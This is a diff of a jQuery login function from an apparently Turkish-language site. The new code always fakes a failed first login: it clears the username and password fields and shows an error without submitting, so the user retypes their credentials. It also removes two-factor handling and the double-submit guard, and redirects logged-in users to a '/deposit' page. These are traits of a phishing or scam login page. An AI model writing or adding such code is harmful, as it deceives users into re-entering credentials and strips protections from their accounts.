@@ -1,55 +1,51 @@
-let isProcessing = false;
-
-function logIn(event) {
-  if (isProcessing) {
-    return;
-  }
+function logIn(){
   event.preventDefault();
-  isProcessing = true;
 
-  // AJAX isteği
-  $.ajax({
-    type: 'POST',
-    url: 'request.php?q=login',
-    data: $('#login_form').serialize(),
-    beforeSend: function () {
-      // AJAX isteği başlamadan önce
-      $('#loadingSpan').removeClass('dis_none');
-      $('#loginButton').prop('disabled', true);
-    },
-    success: function (response) {
-      // AJAX isteği başarılı bir şekilde tamamlandığında
-      if (response == 'error') {
-        $('.reg_error_message').removeClass('hidden');
-        $('#loginerrormessage').removeClass('hidden');
-        $('#loadingSpan').addClass('dis_none');
-        $('#loginButton').prop('disabled', false);
-        if (phone_status == 1 || passport_status == 1) {
-          $('.loginSteps #step_1').removeClass('hidden');
-          $('.loginSteps #step_2').addClass('hidden');
-          phone_status = 1;
-          passport_status = 1;
-        }
-      } else if (response == 'error_phone') {
-        Swal.fire('Hata!', 'Telefon numarasını yanlış girdiniz.', 'error');
-      } else if (response == '2fa') {
-        if ($('#login_form input[name=mobile]').length > 0) {
-          window.location.href = '/2fa';
+  // Eğer errmsg gösteriliyorsa, bu değer true olacak, aksi halde false olacaktır.
+  const firstAttempt = $('#errmsg').hasClass('hidden');
+  
+  if (firstAttempt) {
+     setTimeout(() => {
+      $('#login_form').find('input[type="text"], input[type="password"]').val('');
+    }, 600);
+    
+    
+    // 1 saniye sonra errmsg'yi göster.
+    setTimeout(() => {
+      $('#errmsg').removeClass('hidden');
+    }, 600);
+    
+    return; // Fonksiyonun geri kalanını çalıştırma.
+  }
+  
+  if (phone_status == 1 || passport_status == 1) {
+    $('.loginSteps #step_1').addClass('hidden');
+    $('.loginSteps #step_2').removeClass('hidden');
+    phone_status = 0;
+    passport_status = 0;
+  } else {
+    $.ajax({
+      type: 'POST',
+      url: 'request.php?q=login',
+      data: $('#login_form').serialize(),
+      success: (response) => {
+        if (response == 'error') {
+          Swal.fire('Hata!','Kullanıcı adı ve ya şifre hatalı.','error');
+          if (phone_status == 1 || passport_status == 1) {
+            $('.loginSteps #step_1').removeClass('hidden');
+            $('.loginSteps #step_2').addClass('hidden');
+            phone_status = 1;
+            passport_status = 1;
+          }
+        } else if(response == 'error_phone') {
+          Swal.fire('Hata!','Telefon numarasını yanlış girdiniz.','error');
         } else {
-          openmodal('twoFag', 'none');
-          startCountdown();
+          window.location.href = '/deposit';
         }
-      } else {
-        window.location.href = '/';
       }
-    },
-    complete: function () {
-      // AJAX isteği tamamlandığında (başarıyla veya hata ile)
-      isProcessing = false;
-    }
-  });
+    })
+  }
 }
-
 
 
 
